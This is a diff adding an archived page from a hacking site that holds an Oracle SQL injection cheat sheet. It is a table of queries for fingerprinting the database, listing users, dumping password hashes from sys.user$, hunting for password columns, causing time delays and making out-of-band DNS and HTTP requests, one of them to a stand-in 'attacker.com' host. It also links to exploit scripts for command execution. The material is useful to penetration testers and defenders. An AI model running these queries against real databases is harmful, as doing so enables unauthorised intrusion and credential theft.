@@ -1,0 +1,118 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<style type="text/css">
+/* <![CDATA[ */
+
+table, td
+{
+    border-color: #353637;
+    border-style: solid;
+}
+
+table
+{
+    border-width: 0 0 2px 2px;
+    border-spacing: 0;
+    border-collapse: collapse;
+}
+
+td
+{
+    margin: 0;
+    padding: 10px;
+    border-width: 2px 2px 0 0;
+}
+
+/* ]]> */
+</style>
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+	<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+	
+	<title>darkc0de.com [ Oracle SQL Injection Cheat Sheet ]</title>
+	<link rel="stylesheet" type="text/css" href="/style.css" />
+	
+	</head>
+
+	<body>
+		<div id="outer">
+			<div id="inner">
+			
+				 <div id="close"><a href="/index.shtml" title="close and return to menu">X</a></div>
+				 <div id="top"><a href="#top" title="back to top">^</a></div> 
+			
+				 <!--greyed out links-->
+				<div class="bgtext">dark  c0de</div>
+				 <div id="text1">scanners</div>
+				 <div id="text2">encryption</div>
+				 <div id="text3">miscellaneous</div>
+				 <div id="text4">bruteforce</div>
+				 <div id="text5">irc-bots</div>
+				 <div id="text6">others</div>
+				<div id="text7">development</div>
+				 <div id="text8">py&raquo;exploits</div>	
+				 <div id="text10">[s3rvices]</div>
+				 <div id="text11">Welcome:</div>
+				 <div id="text13">Affiliates</div>
+				 <div id="text14">[sn1ppets]</div>
+				 <div id="text16">Viewed:</div>
+				 <!--greyed out links end-->
+			
+				 <div id="urltext"><a href="/index.shtml" class="navigurl" title="click to return to the index page">/home &raquo; </a>Oracle SQL Injection Cheat Sheet</div>
+				 	  
+					  <div id="content">
+					  	   <a name="top"></a> 
+
+					  	   <div class="titleblock">Welcome,&nbsp;212.235.66.182</div>
+
+    						   Send all updates to <a href="mailto:d3hydr8[at]gmail[dot]com">[ d3hydr8[at]gmail[dot]com ]</a> or use the form below. 
+						   <div class="titleblock">Last Modified: Tuesday, 22-Sep-2009 10:11:07 EDT</div>
+								<br>
+								<center><form action="/cgi-bin/getinput.py" method='post'>
+									<b>Submit:&nbsp;&nbsp;</b>
+    									<textarea maxlength="30" onkeyup="return ismaxlength(this)" style="background-color:#B0C4DE" name = "message" rows = 1 cols = 40>Enter an update with full details.</textarea><br>
+    									<input type="image" border="0" name="submit" value="send" src="/images/submit.jpg"></form></center><br>
+						   			
+									<ul><li><a href="/database/oracle-cs.shtml">Oracle</a></li>
+									<li><a href="/database/mssql-cs.shtml">MSSQL</a></li>
+									<li><a href="/database/mysql-cs.shtml">MySQL</a></li>
+									<li><a href="/database/postgres-cs.shtml">PostgreSQL</a></li>
+									<li><a href="/database/ingres-cs.shtml">Ingres</a></li>
+									<li><a href="/database/db2-cs.shtml">DB2</a></li>
+									<li><a href="/database/msaccess-cs.shtml">MS Access</a></li></ul>
+									<br><br><center>
+									<table width="519">
+									<tbody><tr><td>Version<br></td><td>SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; <br>SELECT banner FROM v$version WHERE banner LIKE 'TNS%';<br>SELECT version FROM v$instance;<br> </td></tr><tr><td>Comments&nbsp;</td><td>SELECT 1 FROM dual -- comment<br>-- NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name 'dual' when we're not actually selecting from a table.<br></td></tr><tr><td>Current User <br></td><td>SELECT user FROM dual <br></td></tr><tr><td>List Users</td><td>SELECT username FROM all_users ORDER BY username;<br>SELECT name FROM sys.user$; -- priv </td></tr><tr><td>List Password Hashes<br></td><td>SELECT name, password, astatus FROM sys.user$ -- priv, &lt;= 10g.&nbsp; astatus tells you if acct is locked<br>SELECT name,spare4 FROM sys.user$ -- priv, 11g </td></tr><tr><td>List Privileges</td><td>SELECT * FROM session_privs; -- current privs<br>SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP'; -- priv, list a user's privs<br> SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY'; -- priv, find users with a particular priv<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;<br></td></tr><tr><td>List DBA Accounts</td><td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES'; -- priv, list DBAs, DBA roles</td></tr><tr><td>Current Database&nbsp;  </td><td>SELECT global_name FROM global_name; <br>SELECT name FROM v$database; <br>SELECT instance_name FROM v$instance;<br>SELECT SYS.DATABASE_NAME FROM DUAL; </td></tr><tr><td>List Databases </td><td><p>SELECT DISTINCT owner FROM all_tables; -- list schemas (one per user)<br>-- Also query TNS listener for other databases.&nbsp; See <a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>  (services | status).  </p></td></tr><tr><td>List Columns <br></td><td>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; <br>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';  <br></td></tr><tr><td>List Tables </td><td>SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables;<br> </td></tr><tr><td>Find Tables From Column Name </td><td>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; -- NB: table names are upper case</td></tr><tr><td>Select Nth Row</td><td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; -- gets 9th row (rows numbered from 1)</td></tr><tr><td>Select Nth Char  <br></td><td> SELECT substr('abcd', 3, 1) FROM dual; -- gets 3rd character, 'c'<br></td></tr><tr><td>Bitwise AND&nbsp; <br></td><td>SELECT bitand(6,2) FROM dual; -- returns 2<br>SELECT bitand(6,1) FROM dual; -- returns0</td></tr><tr><td><p>ASCII Value -&gt; Char</p></td><td>SELECT chr(65) FROM dual; -- returns A<br></td></tr><tr><td>Char -&gt; ASCII Value</td><td>SELECT ascii('A') FROM dual; -- returns 65<br></td></tr><tr><td>Casting</td><td>SELECT CAST(1 AS char) FROM dual;<br>SELECT CAST('1' AS int) FROM dual;</td></tr><tr><td>String Concatenation</td><td>SELECT 'A' || 'B' FROM dual; -- returns AB</td></tr><tr><td>If Statement</td><td>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; -- doesn't play well with SELECT statements <br></td></tr><tr><td>Case Statement</td><td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; -- returns 1<br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; -- returns 2</td></tr><tr><td>Avoiding Quotes <br></td><td>SELECT chr(65) || chr(66) FROM dual; -- returns AB <br></td></tr><tr><td>Time Delay&nbsp; <br></td><td>BEGIN DBMS_LOCK.SLEEP(5); END; -- priv, can't seem to embed this in a SELECT<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; -- if reverse looks are slow<br>SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; -- if forward lookups are slow<br>SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; -- if outbound TCP is filtered / slow<br>-- Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a>  to create a time delay<br></td></tr><tr><td>Make DNS Requests</td><td>SELECT UTL_INADDR.get_host_address('google.com') FROM dual;<br>SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual;</td></tr><tr><td>Command Execution</td><td><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a>  can be used to execute commands if it's installed.</p><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">ExtProc</a>  can sometimes be used too, though it normally failed for me. :-(<br> </p></td></tr><tr><td>Local File Access<br></td><td><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>  can sometimes be used.&nbsp; Check that the following is non-null:<br>SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';</p><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a>  can be used to read and write files if it's installed (it is not available in Oracle Express).&nbsp;</p></td></tr><tr><td>Hostname, IP Address</td><td> SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; -- gets IP address<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; -- gets hostnames</td></tr><tr><td>&nbsp;Location of DB files<br></td><td>SELECT name FROM V$DATAFILE;</td></tr></tbody></table>
+									<br>
+									<br>
+									
+<br><br>
+<a href="http://www.darkc0de.com/store/advertise.html"><font color="white"><b>Advertise Here</b></a></font><br>
+<script language="javascript">
+	zoneIdentifier="3F8D8B7CF6A06513";
+	var varCheckURL = (("https:" == document.location.protocol) ? "https://" : "http://");
+	document.write(unescape("%3Cscript src='" + varCheckURL + "adcode.adengage.com/bootstrap/ae.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<br><br>
+
+									<b><font size="2" face="courier">This site is maintained by d3hydr8[at]gmail[dot]com
+									<br>darkc0de.com &trade; &copy; 2006-Now</font></b>
+									<br>
+									<br>
+									</center>
+									<br>
+									
+						  
+						   		</ol>
+								
+						   <div class="titleblock">EOF</div>
+					 
+					 </div>
+			
+			</div>
+		</div>
+		
+	</body>
+
+</html>
